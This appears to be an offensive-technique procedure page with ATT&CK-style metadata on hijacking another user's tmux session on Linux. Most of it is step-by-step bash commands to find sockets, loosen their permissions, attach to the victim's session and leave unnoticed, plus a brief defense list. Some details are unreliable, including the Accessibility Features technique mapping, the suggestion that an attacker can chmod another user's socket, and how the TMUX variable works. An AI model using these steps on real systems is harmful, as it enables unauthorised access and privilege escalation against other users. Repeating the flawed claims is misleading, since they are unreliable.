---
type: procedure
description: >-
  Hijack a user's TMUX session on Linux to execute commands with their
  privileges, enabling persistence or privilege escalation.
verified: true
submitted: false
tactics:
  - '[[tactics/Persistence|TA0003 - Persistence]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - '[[techniques/Event Triggered Execution|T1546 - Event Triggered Execution]]'
sub_techniques:
  - '[[sub-techniques/Accessibility Features|T1546.008 - Accessibility Features]]'
tags:
  - '[[tags/Hijack TMUX session]]'
  - '[[tags/Linux - Privilege Escalation]]'
  - tmux
  - session-hijacking
  - privilege-escalation
commands:
  - '[[commands/chmod-tmux-socket-readable]]'
  - '[[commands/set-tmux-socket-env-and-list-sessions]]'
  - '[[commands/tmux-attach-to-session]]'
platforms:
  - Linux
tools: []
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
---

# Linux-TMUX-Session-Hijacking

## Summary

This procedure demonstrates how to hijack a running TMUX session on a Linux system by accessing the TMUX socket file, typically misconfigured with permissive permissions. By attaching to the victim's session, an attacker can execute commands in the context of the victim's user privileges, facilitating persistence or privilege escalation without direct credential theft.

## Description

TMUX is a popular terminal multiplexer on Linux systems that allows users to run multiple terminal sessions within a single window. Sessions are managed via a socket file, often located at /tmp/tmux-$UID/default, where $UID is the user's ID. If this socket has world-readable permissions (e.g., due to misconfiguration), a low-privileged attacker can read it to list sessions and attach to them, effectively hijacking the session and running commands as the victim user. This technique is particularly useful in privilege escalation scenarios where the attacker has local access but not elevated privileges. The procedure assumes the attacker is on the same system as the victim session and focuses on socket access and attachment. Success grants interactive shell access in the victim's context, allowing further actions like data exfiltration or lateral movement.

## Requirements

1. Local access to the Linux system where the TMUX session is running (e.g., via initial foothold).
2. The TMUX socket file must exist and be discoverable (e.g., /tmp/tmux-*).
3. Read access to the socket directory (/tmp); if not, this procedure may require prior enumeration.
4. TMUX installed on the system (common on most Linux distributions).
5. Knowledge of the target user's UID to locate the socket.

## Defense

- Restrict TMUX socket permissions to the owning user only (e.g., chmod 700 /tmp/tmux-*).
- Monitor file system changes in /tmp for unexpected permission modifications using tools like auditd or inotify.
- Implement process monitoring to detect unusual TMUX attachments (e.g., via Sysdig or Falco rules for tmux commands from unexpected users).
- Educate users on secure TMUX configuration and avoid running sessions as privileged users.
- Use containerization or namespaces to isolate user sessions.

## Objectives

1. Locate and gain read access to the victim's TMUX socket.
2. Enumerate active TMUX sessions without alerting the user.
3. Attach to a session to execute commands with the victim's privileges.
4. Maintain access for persistence or escalate further.

## Instructions

### Step 1: Locate the TMUX Socket

**Context**: Identify the socket file for the target user's TMUX sessions. Sockets are typically in /tmp/tmux-$UID/default, where $UID corresponds to the victim's user ID. This step uses basic file enumeration to find potential sockets without executing TMUX yet.

Use standard Linux commands to search for TMUX sockets:

```bash
ls /tmp/tmux-* 2>/dev/null
```

> This lists all TMUX-related files in /tmp. Look for directories like tmux-1000 (for UID 1000). Expected output: /tmp/tmux-1000/default. If no sockets are found, the user may not be running TMUX, or check other locations like $HOME/.tmux.

### Step 2: Make the Socket Readable

**Context**: If the socket lacks world-readable permissions, modify them to allow access. This exploits misconfigurations where the socket is group or world accessible, but in a real attack, you may need to do this stealthily to avoid detection.

**Command** ([[commands/chmod-tmux-socket-readable]]):

```bash
chmod +r /tmp/tmux-$_UID/default
```

> This adds read permission to the socket file. Replace $_UID with the victim's UID (e.g., 1000). Expected output: No output if successful; verify with ls -l /tmp/tmux-$_UID/default showing 'r' for others. Why: TMUX uses the socket for inter-process communication; read access allows listing and attaching without ownership.

### Step 3: Set Environment and List Sessions

**Context**: Configure the TMUX environment variable to point to the socket, then list active sessions. This reveals session names and IDs without attaching, allowing the attacker to select a target session.

**Command** ([[commands/set-tmux-socket-env-and-list-sessions]]):

```bash
export TMUX=/tmp/tmux-$_UID/default; tmux ls
```

> Sets TMUX to the socket path and lists sessions. Expected output: mysession: 1 windows (created Mon Apr 10 12:00:00 2023) [80x24]. If no sessions, the procedure fails here. Why: The env var tells TMUX which socket to use; without it, default sockets are assumed.

### Step 4: Attach to the Victim's Session

**Context**: Once sessions are listed, attach to a specific one to hijack it. This transfers control to the attacker's terminal, executing in the victim's context. The original user may notice if actively using the session.

**Command** ([[commands/tmux-attach-to-session]]):

```bash
tmux -S /tmp/tmux-$_UID/default attach -t $_SESSION_NAME
```

> Attaches to the specified session. Replace $_SESSION_NAME with the name from Step 3 (e.g., mysession). Expected output: Interactive shell prompt in the victim's session. Why: This command connects to the socket and joins the session, inheriting the user's environment and privileges. If the session is detached, it reactivates seamlessly.

### Step 5: Verify and Exit Stealthily

**Context**: Confirm privilege level and clean up traces. Run whoami or id to verify context, then detach without killing the session to maintain stealth.

Execute in the hijacked session:

```bash
whoami; id
```

> Expected output: uid=1000(victimuser) gid=1000(victimuser) groups=... Confirming victim's privileges. To detach: Press Ctrl-b then d. Why: Verifies success; detaching allows the session to continue running unnoticed.
